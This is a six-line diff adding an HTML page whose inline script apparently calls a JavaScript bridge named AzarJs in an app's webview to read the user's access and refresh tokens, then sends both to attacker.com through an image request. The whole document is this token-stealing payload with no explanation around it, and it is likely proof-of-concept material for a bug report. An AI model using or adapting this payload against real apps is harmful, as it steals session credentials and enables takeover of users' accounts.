@@ -1,0 +1,6 @@
+<html>
+<script>
+var t = JSON.parse(window.AzarJs.getAccessToken());
+new Image().src = "https://attacker.com/c?a="+t.accessToken+"&r="+t.refreshToken;
+</script>
+</html>
